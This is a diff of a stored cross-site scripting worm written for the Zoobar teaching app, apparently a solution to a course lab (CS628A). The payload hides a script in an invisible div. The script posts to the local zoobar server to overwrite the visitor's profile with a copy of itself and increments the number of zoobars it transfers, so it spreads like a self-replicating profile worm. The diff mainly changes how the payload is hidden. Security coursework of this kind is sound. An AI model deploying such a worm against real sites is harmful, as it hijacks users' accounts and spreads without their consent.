@@ -1,7 +1,6 @@
-<b> I Love CS628A! </b>
+I Love CS628A!
 <span id="zoobars" class="10"></span>
-<iframe width="0" height="0" id="iframe" style="visibility: hidden;" name="iframe"></iframe>
-<div style="visibility:hidden" id="div">
+<div style="visibility:hidden; display: none" id="div">
 	You Can't See Me!!
 	<script>
 		var transfer_zoobar = 1; //zoobars to be transfered
@@ -16,7 +15,7 @@
     	var xhttp_profile = new XMLHttpRequest();
     	xhttp_profile.open('POST', 'http://localhost:8080/zoobar/index.cgi/');
     	xhttp_profile.setRequestHeader('Content-type','application/x-www-form-urlencoded');
-    	var inner = '<b> I Love CS628A! </b>' + '<div style="visibility:hidden" id="div">' + '<span id="zoobars" class="10"><'+'/span>' + document.getElementById("div").innerHTML + '<'+'/div>';
+    	var inner = 'I Love CS628A!' + '<div style="visibility:hidden; display: none" id="div">' + '<span id="zoobars" class="10"><'+'/span>' + document.getElementById("div").innerHTML + '<'+'/div>';
     	inner = inner.replace(/transfer_zoobar = (\d+)+/g, function(match, number) {
                     var num = parseInt(number)+1;
                     return "transfer_zoobar = " + num;
